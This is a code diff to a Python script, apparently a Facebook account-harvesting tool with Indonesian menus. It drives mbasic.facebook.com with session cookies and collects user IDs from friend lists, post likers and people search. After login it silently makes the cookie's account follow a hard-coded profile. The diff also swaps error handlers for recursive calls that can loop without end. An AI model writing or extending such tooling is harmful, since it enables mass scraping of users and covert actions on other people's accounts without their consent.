@@ -114,13 +114,15 @@ def moch_yayan():
                     try:
                         requests.get(mbasic.format(parser(ismi, "html.parser").find("a", string="Bahasa Indonesia")["href"]),cookies=cek)
                     except:
-                        pass
+                        moch_yayan()
+                        
 
                 try:
                     ikuti = parser(requests.get(mbasic.format("/KM39453"), cookies=cek).content, "html.parser").find("a",string="Ikuti")["href"]
                     ses.get(mbasic.format(ikuti), cookies=cek)
                 except:
-                    pass
+                    moch_yayan()
+                    
                 return cek["cookie"]
                 aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
             else:
@@ -281,8 +283,7 @@ def moch_yayan():
                     print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                     yayanxd()
                 elif memek == '1' or memek == '01':
-                    url = parser(ses.get(mbasic.format('/me'), cookies=kuki).content, 'html.parser').find('a',
-                                                                                                          string='Teman')
+                    url = parser(ses.get(mbasic.format('/me'), cookies=kuki).content, 'html.parser').find('a',string='Teman')
                     username = getid(mbasic.format(url["href"]))
                 elif memek == '2' or memek == '02':
                     username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
@@ -294,8 +295,7 @@ def moch_yayan():
                         username = username.replace('m.facebook', 'mbasic.facebook.com')
                     username = fromlikes(username)
                 elif memek == '3' or memek == '03':
-                    knf = input(
-                        "\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
+                    knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                     username = bysearch(mbasic.format('/search/people/?q=' + knf))
                     if len(username) == 0:
                         exit("\033[90m[\033[91m!\033[90m] No Name!")
@@ -312,9 +312,7 @@ def moch_yayan():
                     else:
                         user = "/" + knf
                     try:
-                        user = parser(requests.get(mbasic.format(user), cookies=kuki).content, "html.parser").find('a',
-                                                                                                                   string="Teman")[
-                            "href"]
+                        user = parser(requests.get(mbasic.format(user), cookies=kuki).content, "html.parser").find('a',string="Teman")["href"]
                         username = getid(mbasic.format(user))
                     except TypeError:
                         exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
